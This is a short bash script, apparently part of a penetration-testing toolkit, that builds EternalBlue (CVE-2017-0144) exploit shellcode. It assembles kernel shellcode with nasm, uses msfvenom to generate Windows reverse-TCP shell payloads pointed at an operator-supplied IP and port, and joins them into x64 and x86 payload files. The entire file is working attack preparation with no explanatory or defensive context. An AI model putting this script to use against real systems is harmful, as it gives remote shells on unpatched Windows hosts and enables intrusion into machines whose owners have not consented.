#!/bin/bash
set -e

host_IP=$1
Listen_port=$2

sudo nasm -f bin /usr/share/ddt/CVE-2017-0144/Shellcode/eternalblue_kshellcode_x64.asm -o /usr/share/ddt/CVE-2017-0144/sc_x64_kernel.bin
sudo nasm -f bin /usr/share/ddt/CVE-2017-0144/Shellcode/eternalblue_kshellcode_x86.asm -o /usr/share/ddt/CVE-2017-0144/sc_x86_kernel.bin

sudo msfvenom -p windows/x64/shell_reverse_tcp -f raw -o /usr/share/ddt/CVE-2017-0144/sc_x64_msf.bin EXITFUNC=thread LHOST=$1 LPORT=$2
sudo msfvenom -p windows/shell_reverse_tcp -f raw -o /usr/share/ddt/CVE-2017-0144/sc_x86_msf.bin EXITFUNC=thread LHOST=$1 LPORT=$2
        
sudo cat /usr/share/ddt/CVE-2017-0144/sc_x64_kernel.bin /usr/share/ddt/CVE-2017-0144/sc_x64_msf.bin > /usr/share/ddt/CVE-2017-0144/sc_x64.bin
sudo cat /usr/share/ddt/CVE-2017-0144/sc_x86_kernel.bin /usr/share/ddt/CVE-2017-0144/sc_x86_msf.bin > /usr/share/ddt/CVE-2017-0144/sc_x86.bin

echo IP: $1
echo port: $2

exit 0


